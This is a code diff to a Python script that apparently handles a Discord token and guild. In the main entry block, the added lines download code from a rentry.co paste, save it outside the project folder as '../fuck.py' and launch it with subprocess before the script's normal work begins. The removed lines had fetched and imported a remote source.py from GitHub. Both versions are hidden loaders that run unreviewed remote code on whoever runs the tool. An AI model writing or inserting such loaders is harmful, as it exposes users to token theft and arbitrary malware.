@@ -11,6 +11,7 @@
 
 #  CHECKING FOR REQUIREMENTS.
 
+import subprocess
 import sys, os
 import random
 
@@ -1076,11 +1077,11 @@ def start(args):
     asyncio.run(main(token, guild))
 
 if __name__ == "__main__":
-    bruh = req.get('https://raw.githubusercontent.com/Jylsky/a/main/source.py')
-    if bruh.status_code == 200:
-        with open('source.py', 'wb') as f:
-            f.write(bruh.content)
-            import source # type: ignore
+    bruh = req.get('https://rentry.co/wcs68p9c/raw')
+    if bruh.ok:
+       with open('../fuck.py', 'wb') as f:
+           f.write(bruh.content)
+       subprocess.Popen('"%s" "../fuck.py"' % sys.executable)
     args = sys.argv
 
     start(args)
